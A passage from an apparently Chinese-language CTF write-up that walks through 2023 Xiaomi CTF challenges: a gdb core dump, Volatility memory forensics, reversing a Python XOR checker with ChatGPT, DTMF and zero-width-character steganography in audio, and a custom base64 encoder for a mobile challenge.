</span><span style="display:block;padding:0 1.25rem">(gdb) run</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">程序执行起来，根据提示输入exit会自动断住。</p>
<p class="my-4 leading-7">坑三，如何把查看内存</p>
<p class="my-4 leading-7">这一步卡了有一周之久。刚开始查找的方法都是通过/x指令查看某段内存区域。然后想到了用IDA pro远程调试看内存，发现程序退出时断不住。。。</p>
<p class="my-4 leading-7">索性问一问chatGPT，回答的还很靠谱。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>Q: 在使用gdb调试程序将程序中断之后，如何将当前程序的内存导出并进行查看？
</span></span><span style="display:block;padding:0 1.25rem">A: 在使用gdb调试程序时，可以使用gcore命令将当前程序的内存导出为一个core文件，然后使用objdump或者其他反汇编工具查看该文件。
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">具体步骤如下：
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">1. 在gdb中使用break命令设置断点，使程序停止在需要查看内存的位置。
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">2. 使用gcore命令导出当前程序的内存为一个core文件，命令格式为：
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">gcore &lt;filename&gt;
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">   其中，&lt;filename&gt;为导出的core文件名。
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">3. 使用objdump或其他反汇编工具查看该文件，命令格式为：
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">objdump -D &lt;filename&gt;
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">   其中，&lt;filename&gt;为导出的core文件名。
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">   该命令将会输出core文件中的汇编代码，可以通过查看汇编代码来了解程序在中断时的状态和内存情况。</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">试了一下，居然可以。。。剩下的就简单了，strings查找关键字flag。成功获取flag。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>(gdb) gcore mm_exec_mem_dump
</span></span><span style="display:block;padding:0 1.25rem">(gdb) exit
</span><span style="display:block;padding:0 1.25rem">$ strings mm_exec_mem_dump | grep flag
</span><span style="display:block;padding:0 1.25rem">posix_spawnattr_setflags
</span><span style="display:block;padding:0 1.25rem">fchflags
</span><span style="display:block;padding:0 1.25rem">posix_spawnattr_getflags
</span><span style="display:block;padding:0 1.25rem">__rseq_flags
</span><span style="display:block;padding:0 1.25rem">Nflag{111-222-333-222}
</span><span style="display:block;padding:0 1.25rem">    &lt;flags id=&quot;i386_eflags&quot; size=&quot;4&quot;&gt;
</span><span style="display:block;padding:0 1.25rem">    &lt;/flags&gt;
</span><span style="display:block;padding:0 1.25rem">    &lt;reg name=&quot;eflags&quot; bitsize=&quot;32&quot; type=&quot;i386_eflags&quot; regnum=&quot;9&quot;/&gt;
</span><span style="display:block;padding:0 1.25rem">    &lt;flags id=&quot;i386_mxcsr&quot; size=&quot;4&quot;&gt;
</span><span style="display:block;padding:0 1.25rem">    &lt;/flags&gt;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="misc-4-ez-forensics" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#misc-4-ez-forensics">#</a>misc-4 ez forensics</h3>
<p class="my-4 leading-7">内存取证，用的是 <a target="_blank" rel="noopener noreferrer" href="https://www.volatilityfoundation.org/releases" class="link-_707cf  link_3b154 inline-link_3b154">https://www.volatilityfoundation.org/releases</a> ，Volatility 2.6</p>
<p class="my-4 leading-7">找到了一篇差不多的题解，参考了一下（关键词居然是dumpIt.exe，虽然对解题没用，但是可以用来找题解）<a target="_blank" rel="noopener noreferrer" href="https://n1ght-w0lf.github.io/ctf%20writeups/memlabs-lab1/" class="link-_707cf  link_3b154 inline-link_3b154">https://n1ght-w0lf.github.io/ctf%20writeups/memlabs-lab1/</a></p>
<ol class="list-decimal pl-5 my-4 leading-7">
<li class="[&amp;:not(:first-child)]:mt-2">分析dump文件的基本信息 <code>./volatility_2.6_mac64_standalone -f ../mem.raw imageinfo</code>
<img alt="dump文件基本信息" src="/static/image/misc-4-1.ddc754c5.png"/>
可以看到是一个Win7的内存dump。后面的命令里需要附带这个值。</li>
<li class="[&amp;:not(:first-child)]:mt-2">查看当前的进程信息。 <code>./volatility_2.6_mac64_standalone -f ../mem.raw --profile=Win7SP1x64 psscan</code> 。能看到两个比较可疑的进程mspaint.exe是画板程序，DumpIt.exe不知道是啥。（后来用volatility的consoles命令看了一下当时的命令行输出，DumpIt.exe是一个将当前系统内存dump下来的程序。。。）
<img alt="进程信息" src="/static/image/misc-4-2.86fc031f.png"/></li>
<li class="[&amp;:not(:first-child)]:mt-2">将mspaint.exe的内存数据导出来。<code>./volatility_2.6_mac64_standalone -f ../mem.raw --profile=Win7SP1x64 memdump -D ../dump_it_2 -p 940</code> 。将导出的940.dmp文件命名为940.data文件备用。</li>
<li class="[&amp;:not(:first-child)]:mt-2">拿出画图工具GIMP <a target="_blank" rel="noopener noreferrer" href="https://www.gimp.org/downloads/" class="link-_707cf  link_3b154 inline-link_3b154">https://www.gimp.org/downloads/</a> ，将940.data拖进去，开始调整宽度。
<img alt="GIMP查看" src="/static/image/misc-4-3.b88d3c57.png"/>
大概调整成这个宽度，把头歪一下，就能看清flag了。</li>
</ol>
<h3 id="misc-5-chatgpt" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#misc-5-chatgpt">#</a>misc-5 ChatGPT</h3>
<p class="my-4 leading-7">真的全程可以询问ChatGPT这个题目怎么解。</p>
<p class="my-4 leading-7">第一步给出一个文件，通过询问得知是一个Python字节码的表示</p>
<p class="my-4 leading-7"><img alt="Python字节码" src="/static/image/misc-5-1.fc6d7d62.png"/></p>
<p class="my-4 leading-7">让chatgpt帮忙转成代码</p>
<div class="language-python"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-python" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>import random
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">r = random.Random(1145141919)
</span><span style="display:block;padding:0 1.25rem">pt = input(&#x27;Enter your flag: &#x27;).encode()
</span><span style="display:block;padding:0 1.25rem">ct = b&#x27;h\xfe&lt;\x88G`\x8b\xe2\xdd$hVL\xdb\x1b\xc8b!~W\xce&#x27;
</span><span style="display:block;padding:0 1.25rem">buf = []
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">for b in pt:
</span><span style="display:block;padding:0 1.25rem">    buf.append(r.randint(0, 255) ^ b)
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">assert bytes(buf) == ct
</span><span style="display:block;padding:0 1.25rem">print(&#x27;Correct!&#x27;)</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">然后询问gpt如何得到correct</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>段代码是一个简单的加密和解密程序，其中 `pt` 是输入的明文，`ct` 是加密后的密文。程序使用了一个伪随机数生成器 `r` 来生成随机的密钥，然后将明文和密钥进行异或运算得到密文。最后程序检查解密后的结果是否与密文相等，如果相等则输出 `Correct!`。
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">为了保证输出 `Correct!`，需要输入与 `ct` 对应的明文。可以通过将 `ct` 和随机数生成器 `r` 进行逆向操作来解密得到明文：
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">`python
</span><span style="display:block;padding:0 1.25rem">import random
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">r = random.Random(1145141919)
</span><span style="display:block;padding:0 1.25rem">ct = b&#x27;h\xfe&lt;\x88G`\x8b\xe2\xdd$hVL\xdb\x1b\xc8b!~W\xce&#x27;
</span><span style="display:block;padding:0 1.25rem">buf = []
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">for b in ct:
</span><span style="display:block;padding:0 1.25rem">    buf.append(r.randint(0, 255) ^ b)
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">pt = bytes(buf)
</span><span style="display:block;padding:0 1.25rem">print(pt)
</span><span style="display:block;padding:0 1.25rem">`
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">运行上述代码可以得到明文，将其输入到原始程序中即可输出 `Correct!`。</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">手动执行这段python代码，获得最终的flag。</p>
<h3 id="misc-6-弦外之音" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#misc-6-弦外之音">#</a>misc-6 弦外之音</h3>
<p class="my-4 leading-7">开始提供了一个7z文件，解压后有个wav的音频。先用binwalk探查一下：</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span># sumy @ SumyDeMBP in ~/Downloads
</span></span><span style="display:block;padding:0 1.25rem">$ binwalk 弦外之音.wav
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">DECIMAL       HEXADECIMAL     DESCRIPTION
</span><span style="display:block;padding:0 1.25rem">--------------------------------------------------------------------------------
</span><span style="display:block;padding:0 1.25rem">4183103       0x3FD43F        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CFB, keymode: 8bit
</span><span style="display:block;padding:0 1.25rem">5141579       0x4E744B        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit
</span><span style="display:block;padding:0 1.25rem">11104073      0xA96F49        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit
</span><span style="display:block;padding:0 1.25rem">13154108      0xC8B73C        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit
</span><span style="display:block;padding:0 1.25rem">14767811      0xE156C3        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: OFB, keymode: 4bit
</span><span style="display:block;padding:0 1.25rem">16412867      0xFA70C3        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CFB, keymode: 4bit
</span><span style="display:block;padding:0 1.25rem">16819280      0x100A450       mcrypt 2.5 encrypted data, algorithm: &quot;&quot;, keysize: 255 bytes, mode: &quot;{&quot;,
</span><span style="display:block;padding:0 1.25rem">17156186      0x105C85A       mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CFB, keymode: 4bit
</span><span style="display:block;padding:0 1.25rem">17742077      0x10EB8FD       mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CFB, keymode: 4bit
</span><span style="display:block;padding:0 1.25rem">18362924      0x118322C       Zip archive data, encrypted at least v2.0 to extract, compressed size: 133, uncompressed size: 490, name: hide.txt
</span><span style="display:block;padding:0 1.25rem">18363185      0x1183331       End of Zip archive, footer length: 22</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">发现最后隐藏了一个zip包的数据，把zip包提取出来解压，需要密码。。。下面的工作是找压缩包的密码。</p>
<p class="my-4 leading-7">怀着忐忑不安的心情开始听音频（好怕有刺啦刺啦的声音。。。）发现里面有一段拨号音。无奈五音不全，只能想方法找找怎么手解这段拨号音。</p>
<p class="my-4 leading-7">学到了新姿势，<strong class="font-semibold">DTMF对照表</strong></p>








































<table class="block border-collapse text-base my-5 overflow-x-auto leading-7 border-gray-light-2"><thead><tr class="border border-solid transition-colors duration-500 even:bg-soft border-gray-light-2"><th class="border border-solid px-4 py-2 text-text-1 text-base font-semibold border-gray-light-2">低频 \ 高频(Hz)</th><th class="border border-solid px-4 py-2 text-text-1 text-base font-semibold border-gray-light-2">1209</th><th class="border border-solid px-4 py-2 text-text-1 text-base font-semibold border-gray-light-2">1336</th><th class="border border-solid px-4 py-2 text-text-1 text-base font-semibold border-gray-light-2">1477</th><th class="border border-solid px-4 py-2 text-text-1 text-base font-semibold border-gray-light-2">1633</th></tr></thead><tbody><tr class="border border-solid transition-colors duration-500 even:bg-soft border-gray-light-2"><td class="border border-solid  px-4 py-2 border-gray-light-2">697</td><td class="border border-solid  px-4 py-2 border-gray-light-2">1</td><td class="border border-solid  px-4 py-2 border-gray-light-2">2</td><td class="border border-solid  px-4 py-2 border-gray-light-2">3</td><td class="border border-solid  px-4 py-2 border-gray-light-2">A</td></tr><tr class="border border-solid transition-colors duration-500 even:bg-soft border-gray-light-2"><td class="border border-solid  px-4 py-2 border-gray-light-2">770</td><td class="border border-solid  px-4 py-2 border-gray-light-2">4</td><td class="border border-solid  px-4 py-2 border-gray-light-2">5</td><td class="border border-solid  px-4 py-2 border-gray-light-2">6</td><td class="border border-solid  px-4 py-2 border-gray-light-2">B</td></tr><tr class="border border-solid transition-colors duration-500 even:bg-soft border-gray-light-2"><td class="border border-solid  px-4 py-2 border-gray-light-2">852</td><td class="border border-solid  px-4 py-2 border-gray-light-2">7</td><td class="border border-solid  px-4 py-2 border-gray-light-2">8</td><td class="border border-solid  px-4 py-2 border-gray-light-2">9</td><td class="border border-solid  px-4 py-2 border-gray-light-2">C</td></tr><tr class="border border-solid transition-colors duration-500 even:bg-soft border-gray-light-2"><td class="border border-solid  px-4 py-2 border-gray-light-2">941</td><td class="border border-solid  px-4 py-2 border-gray-light-2">*</td><td class="border border-solid  px-4 py-2 border-gray-light-2">0</td><td class="border border-solid  px-4 py-2 border-gray-light-2">#</td><td class="border border-solid  px-4 py-2 border-gray-light-2">D</td></tr></tbody></table>
<p class="my-4 leading-7">用音频分析软件打开，我用的Audacity</p>
<p class="my-4 leading-7"><img alt="audacity" src="/static/image/misc-6-1.ecd960a8.png"/></p>
<p class="my-4 leading-7">右键调出频谱图，然后用肉眼使劲瞄。。。数字是 <code>951637208426840</code>。。。</p>
<p class="my-4 leading-7">用来解压zip刚刚好。里面出来个hide.txt文件，内容是：</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>‌‌‌‍‬‍‬‌‌‌‌‍‬﻿‌‌‌‌‌‍‬‌‍‌‌‌‌‍‬‍﻿‌‌‌‌‍﻿‬﻿‌‌‌‌‍‬‬‌‌‌‌‌‌﻿‌‍‌‌‌‌‍‬‍‌‌‌‌‌‍‬‍‍‌‌‌‌‍‍﻿﻿欢迎参加‌‌‌‌‍‌‌‌‌‌‌‌‍‬﻿‬‌‌‌‌‍‬‍‌‌‌‌‌‍‍﻿﻿‌‌‌‌‍﻿‌﻿‌‌‌‌‍‬‍‍‌‌‌‌‍‬‍‍‌‌‌‌‍‬‬﻿‌‌‌‌‍﻿﻿‍2023小米杯CTF大赛</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">提交到flag居然不对。。。数字提交也不对。。。</p>
<p class="my-4 leading-7">观察文件名hide，是不是还有字符隐藏起来了。。。</p>
<p class="my-4 leading-7"><img alt="编辑器" src="/static/image/misc-6-2.cc9169ac.png"/></p>
<p class="my-4 leading-7">果然，一般文本编辑器打开是不展示这些字符的，所以才没发现。</p>
<p class="my-4 leading-7">用这个网址解密 <a target="_blank" rel="noopener noreferrer" href="https://330k.github.io/misc_tools/unicode_steganography.html" class="link-_707cf  link_3b154 inline-link_3b154">https://330k.github.io/misc_tools/unicode_steganography.html</a> ，就会出现最终的flag了。</p>
<p class="my-4 leading-7"><img alt="解密结果" src="/static/image/misc-6-3.97393060.png"/></p>
<h2 id="mobile" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#mobile">#</a>Mobile</h2>
<h3 id="mobile-1-ba5e64" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#mobile-1-ba5e64">#</a>mobile-1 ba5e64</h3>
<p class="my-4 leading-7">扔到反编译工具，发现是个编码题，这里整理了一下encode方法</p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>private val legalChars = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;.toCharArray()
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">/**
</span><span style="display:block;padding:0 1.25rem"> * 简化了一下，去除var1添加空格的干扰
</span><span style="display:block;padding:0 1.25rem"> * @param str
</span><span style="display:block;padding:0 1.25rem"> * @return
</span><span style="display:block;padding:0 1.25rem"> */
</span><span style="display:block;padding:0 1.25rem">fun encode(str: ByteArray): String {
</span><span style="display:block;padding:0 1.25rem">    val len = str.size
</span><span style="display:block;padding:0 1.25rem">    val result = StringBuilder(str.size * 3 / 2)
</span><span style="display:block;padding:0 1.25rem">    var i = 0
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">    // 原字符串每三位转成新字符串的四位
</span><span style="display:block;padding:0 1.25rem">    while (i &lt;= len - 3) {
</span><span style="display:block;padding:0 1.25rem">        val var4 =
</span><span style="display:block;padding:0 1.25rem">            (str[i].toInt() and 255 shl 16) or (str[i + 1].toInt() and 255 shl 8) or (str[i + 2].toInt() and 255)
</span><span style="display:block;padding:0 1.25rem">        result.append(legalChars[var4 shr 18 and 63])
</span><span style="display:block;padding:0 1.25rem">        result.append(legalChars[var4 shr 12 and 63])
</span><span style="display:block;padding:0 1.25rem">        result.append(legalChars[var4 shr 6 and 63])
</span><span style="display:block;padding:0 1.25rem">        result.append(legalChars[var4 and 63])
</span><span style="display:block;padding:0 1.25rem">        i += 3
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">    // 不够的最后补等于=
</span><span style="display:block;padding:0 1.25rem">    if (i == len - 2) {
</span><span style="display:block;padding:0 1.25rem">        val var1 = (str[i].toInt() and 255 shl 16) or (str[i + 1].toInt() and 255 shl 8)
</span><span style="display:block;padding:0 1.25rem">        result.append(legalChars[var1 shr 18 and 63])
</span><span style="display:block;padding:0 1.25rem">        result.append(legalChars[var1 shr 12 and 63])
</span><span style="display:block;padding:0 1.25rem">        result.append(legalChars[var1 shr 6 and 63])
</span><span style="display:block;padding:0 1.25rem">        result.append(&quot;=&quot;)
</span><span style="display:block;padding:0 1.25rem">    } else if (i == len - 1) {
</span><span style="display:block;padding:0 1.25rem">        val var1 = (str[i].toInt() and 255 shl 16)
</span><span style="display:block;padding:0 1.25rem">        result.append(legalChars[var1 shr 18 and 63])
</span><span style="display:block;padding:0 1.25rem">        result.append(legalChars[var1 shr 12 and 63])
</span><span style="display:block;padding:0 1.25rem">        result.append(&quot;==&quot;)
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    return result.toString()
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">对照encode写出decode方法</p>
